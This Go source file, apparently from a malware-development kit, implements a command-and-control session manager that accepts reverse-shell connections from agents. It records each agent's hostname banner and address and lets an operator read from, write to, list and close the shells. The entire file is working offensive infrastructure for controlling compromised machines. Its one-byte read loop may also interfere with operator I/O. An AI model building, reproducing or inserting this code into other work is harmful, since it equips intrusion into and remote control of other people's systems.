package multicat

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/oioio-space/maldev/c2/transport"
)

const (
	// BannerPrefix is the wire-protocol prefix an agent sends on connect to
	// announce its hostname: "BANNER:<hostname>\n". Read within bannerDeadline.
	BannerPrefix = "BANNER:"

	bannerDeadline = 500 * time.Millisecond
	eventBufSize   = 64
)

// EventType identifies what kind of session lifecycle event occurred.
type EventType int

const (
	// EventOpened fires when a new agent connection is accepted.
	EventOpened EventType = iota
	// EventClosed fires when a session is closed (by Remove or connection EOF).
	EventClosed
)

// SessionMetadata holds identifying information about a connected agent.
type SessionMetadata struct {
	// ID is a sequential integer string ("1", "2", ...).
	ID string
	// RemoteAddr is the agent's network address.
	RemoteAddr net.Addr
	// ConnectedAt is the wall-clock time of connection acceptance.
	ConnectedAt time.Time
	// Hostname is populated if the agent sends "BANNER:<hostname>\n" on connect.
	Hostname string
}

// Session represents one active reverse shell connection.
// It implements io.ReadWriteCloser for direct operator ↔ agent I/O.
type Session struct {
	Meta SessionMetadata
	conn net.Conn
}

func (s *Session) Read(p []byte) (int, error)  { return s.conn.Read(p) }
func (s *Session) Write(p []byte) (int, error) { return s.conn.Write(p) }
func (s *Session) Close() error                { return s.conn.Close() }

// Event is emitted on the Manager.Events() channel for each session lifecycle change.
type Event struct {
	Type    EventType
	Session *Session
}

// Manager multiplexes incoming reverse shell connections into named sessions.
// All state is in-memory; sessions do not survive a restart.
type Manager struct {
	mu       sync.RWMutex
	sessions map[string]*Session
	counter  atomic.Int32
	events   chan Event
}

// New creates an idle Manager ready to accept connections.
func New() *Manager {
	return &Manager{
		sessions: make(map[string]*Session),
		events:   make(chan Event, eventBufSize),
	}
}

// Listen accepts connections from l until ctx is cancelled or l is closed.
// Each accepted connection is handled in its own goroutine.
func (m *Manager) Listen(ctx context.Context, l transport.Listener) error {
	defer l.Close()
	for {
		conn, err := l.Accept(ctx)
		if err != nil {
			select {
			case <-ctx.Done():
				return nil
			default:
				return fmt.Errorf("multicat: accept: %w", err)
			}
		}
		go m.handle(conn)
	}
}

func (m *Manager) handle(conn net.Conn) {
	id := fmt.Sprintf("%d", m.counter.Add(1))

	meta := SessionMetadata{
		ID:          id,
		RemoteAddr:  conn.RemoteAddr(),
		ConnectedAt: time.Now(),
	}

	conn.SetReadDeadline(time.Now().Add(bannerDeadline))
	scanner := bufio.NewReader(conn)
	line, err := scanner.ReadString('\n')
	conn.SetReadDeadline(time.Time{})
	if err == nil && strings.HasPrefix(line, BannerPrefix) {
		meta.Hostname = strings.TrimSpace(strings.TrimPrefix(line, BannerPrefix))
	}

	sess := &Session{Meta: meta, conn: conn}

	m.mu.Lock()
	m.sessions[id] = sess
	m.mu.Unlock()

	m.emit(Event{Type: EventOpened, Session: sess})

	buf := make([]byte, 1)
	for {
		_, err := conn.Read(buf)
		if err != nil {
			break
		}
	}

	m.mu.Lock()
	delete(m.sessions, id)
	m.mu.Unlock()

	m.emit(Event{Type: EventClosed, Session: sess})
}

func (m *Manager) emit(ev Event) {
	select {
	case m.events <- ev:
	default:
	}
}

// Events returns the channel on which session lifecycle events are delivered.
func (m *Manager) Events() <-chan Event { return m.events }

// Sessions returns a snapshot of all currently active sessions.
func (m *Manager) Sessions() []*Session {
	m.mu.RLock()
	defer m.mu.RUnlock()
	out := make([]*Session, 0, len(m.sessions))
	for _, s := range m.sessions {
		out = append(out, s)
	}
	return out
}

// Get returns the session with the given ID and whether it was found.
func (m *Manager) Get(id string) (*Session, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	s, ok := m.sessions[id]
	return s, ok
}

// Remove closes the session's connection and removes it from the manager.
// It emits EventClosed before returning. Returns an error if the session does not exist.
func (m *Manager) Remove(id string) error {
	m.mu.Lock()
	sess, ok := m.sessions[id]
	if !ok {
		m.mu.Unlock()
		return fmt.Errorf("multicat: session %q not found", id)
	}
	delete(m.sessions, id)
	m.mu.Unlock()

	sess.conn.Close()
	m.emit(Event{Type: EventClosed, Session: sess})
	return nil
}
